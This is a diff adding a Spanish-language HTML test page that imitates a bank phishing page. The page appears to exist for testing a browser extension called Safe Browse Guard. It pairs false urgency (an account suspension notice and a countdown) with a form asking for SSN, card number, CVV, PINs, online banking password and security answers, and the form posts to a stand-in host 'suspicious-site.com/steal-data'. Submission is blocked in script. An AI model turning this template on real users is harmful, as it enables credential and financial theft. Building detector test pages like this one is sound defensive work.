@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actualización de Cuenta - Banco Seguro</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: #f0f2f5;
+            line-height: 1.6;
+        }
+        
+        .header {
+            background: #1e3a8a;
+            color: white;
+            padding: 20px 0;
+            text-align: center;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .alert {
+            background: #fee2e2;
+            border-left: 4px solid #dc2626;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .alert-icon {
+            color: #dc2626;
+            font-size: 1.5rem;
+            margin-right: 10px;
+        }
+        
+        .content {
+            padding: 40px;
+        }
+        
+        .form-section {
+            margin-bottom: 30px;
+        }
+        
+        .form-section h3 {
+            color: #1e3a8a;
+            border-bottom: 2px solid #e5e7eb;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group.full-width {
+            grid-column: 1 / -1;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #374151;
+            font-weight: 600;
+        }
+        
+        .required {
+            color: #dc2626;
+        }
+        
+        input[type="text"], input[type="email"], input[type="password"], 
+        input[type="tel"], input[type="date"], select, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #d1d5db;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: border-color 0.3s;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: #3b82f6;
+        }
+        
+        .security-info {
+            background: #fef3c7;
+            border: 1px solid #f59e0b;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        
+        .btn-submit {
+            background: #dc2626;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 6px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s;
+            width: 100%;
+            margin-top: 20px;
+        }
+        
+        .btn-submit:hover {
+            background: #b91c1c;
+        }
+        
+        .warning-notice {
+            background: #fef2f2;
+            border: 1px solid #fecaca;
+            color: #991b1b;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 30px 0;
+            text-align: center;
+        }
+        
+        .countdown {
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: #dc2626;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        @media (max-width: 768px) {
+            .form-row {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h2>🏦 Banco Seguro - Actualización Urgente</h2>
+        <p>Sistema de Verificación de Seguridad</p>
+    </div>
+    
+    <div class="container">
+        <div class="content">
+            <div class="alert">
+                <span class="alert-icon">⚠️</span>
+                <strong>ACCIÓN REQUERIDA:</strong> Su cuenta ha sido suspendida temporalmente por actividad sospechosa. 
+                Complete la verificación en los próximos 24 horas para evitar el cierre permanente.
+            </div>
+            
+            <div class="warning-notice">
+                <h3>🚨 Esta es una página de PRUEBA ALTAMENTE SOSPECHOSA</h3>
+                <p><strong>Esta página DEBERÍA ser detectada como PELIGROSA</strong> por la extensión Safe Browse Guard. Contiene múltiples campos financieros sospechosos típicos de ataques de phishing.</p>
+            </div>
+            
+            <div class="countdown">
+                ⏰ Tiempo restante: <span id="countdown">23:59:45</span>
+            </div>
+            
+            <form id="suspiciousForm" action="https://suspicious-site.com/steal-data" method="post">
+                <div class="form-section">
+                    <h3>📋 Información Personal</h3>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="firstName">Primer Nombre <span class="required">*</span></label>
+                            <input type="text" id="firstName" name="first_name" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="middleName">Segundo Nombre</label>
+                            <input type="text" id="middleName" name="middle_name">
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="lastName">Apellido <span class="required">*</span></label>
+                            <input type="text" id="lastName" name="last_name" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="dob">Fecha de Nacimiento <span class="required">*</span></label>
+                            <input type="date" id="dob" name="date_of_birth" required>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="ssn">Número de Seguro Social <span class="required">*</span></label>
+                            <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="driversLicense">Número de Licencia de Conducir</label>
+                            <input type="text" id="driversLicense" name="drivers_license" required>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-section">
+                    <h3>💳 Información Bancaria</h3>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="accountNumber">Número de Cuenta Bancaria <span class="required">*</span></label>
+                            <input type="text" id="accountNumber" name="bank_account_number" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="routingNumber">Número de Ruta (Routing Number) <span class="required">*</span></label>
+                            <input type="text" id="routingNumber" name="routing_number" required>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="swiftCode">Código SWIFT/BIC</label>
+                            <input type="text" id="swiftCode" name="swift_code">
+                        </div>
+                        <div class="form-group">
+                            <label for="ibanNumber">Número IBAN</label>
+                            <input type="text" id="ibanNumber" name="iban_number">
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-section">
+                    <h3>💳 Información de Tarjetas de Crédito</h3>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="creditCardNumber">Número de Tarjeta de Crédito <span class="required">*</span></label>
+                            <input type="text" id="creditCardNumber" name="credit_card_number" placeholder="XXXX XXXX XXXX XXXX" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="cvv">Código CVV/CVC <span class="required">*</span></label>
+                            <input type="text" id="cvv" name="cvv_code" placeholder="XXX" maxlength="4" required>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="expiryDate">Fecha de Expiración <span class="required">*</span></label>
+                            <input type="text" id="expiryDate" name="expiry_date" placeholder="MM/YY" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="pinCode">Código PIN de la Tarjeta <span class="required">*</span></label>
+                            <input type="password" id="pinCode" name="pin_code" maxlength="4" required>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-section">
+                    <h3>🔐 Información de Seguridad</h3>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="currentPassword">Contraseña Actual de Banca Online <span class="required">*</span></label>
+                            <input type="password" id="currentPassword" name="current_password" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="atmPin">PIN del Cajero Automático <span class="required">*</span></label>
+                            <input type="password" id="atmPin" name="atm_pin" maxlength="4" required>
+                        </div>
+                    </div>
+                    
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="motherMaiden">Apellido de Soltera de su Madre <span class="required">*</span></label>
+                            <input type="text" id="motherMaiden" name="mother_maiden_name" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="petName">Nombre de su Primera Mascota</label>
+                            <input type="text" id="petName" name="pet_name">
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="form-section">
+                    <h3>📄 Información Fiscal</h3>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="taxId">Número de Identificación Fiscal <span class="required">*</span></label>
+                            <input type="text" id="taxId" name="tax_id_number" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="employerTaxId">EIN del Empleador</label>
+                            <input type="text" id="employerTaxId" name="employer_ein">
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="security-info">
+                    <strong>🔒 Información de Seguridad:</strong> Toda la información proporcionada será encriptada 
+                    y procesada de forma segura. Este proceso es obligatorio para mantener su cuenta activa.
+                </div>
+                
+                <button type="submit" class="btn-submit">
+                    🚨 VERIFICAR CUENTA INMEDIATAMENTE
+                </button>
+                
+                <div style="text-align: center; margin-top: 20px; font-size: 12px; color: #666;">
+                    Si no completa este proceso en las próximas 24 horas, su cuenta será cerrada permanentemente.
+                </div>
+            </form>
+        </div>
+    </div>
+    
+    <script>
+        // Script sospechoso que intenta capturar datos
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Página de phishing cargada - ESTO ES UNA PRUEBA');
+            
+            // Contador regresivo falso para crear urgencia
+            let timeLeft = 86385; // 23:59:45 en segundos
+            
+            function updateCountdown() {
+                const hours = Math.floor(timeLeft / 3600);
+                const minutes = Math.floor((timeLeft % 3600) / 60);
+                const seconds = timeLeft % 60;
+                
+                const display = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                document.getElementById('countdown').textContent = display;
+                
+                timeLeft--;
+                if (timeLeft < 0) {
+                    timeLeft = 86400; // Reiniciar a 24 horas
+                }
+            }
+            
+            setInterval(updateCountdown, 1000);
+            
+            // Simular envío de formulario (solo para pruebas)
+            document.getElementById('suspiciousForm').addEventListener('submit', function(e) {
+                e.preventDefault();
+                alert('🚨 FORMULARIO BLOQUEADO - Esta es una página de prueba de phishing. En un ataque real, sus datos habrían sido robados.');
+            });
+            
+            // Script malicioso simulado
+            console.warn('ADVERTENCIA: Esta página contiene múltiples campos sospechosos y debería ser bloqueada por Safe Browse Guard');
+        });
+    </script>
+</body>
+</html> 
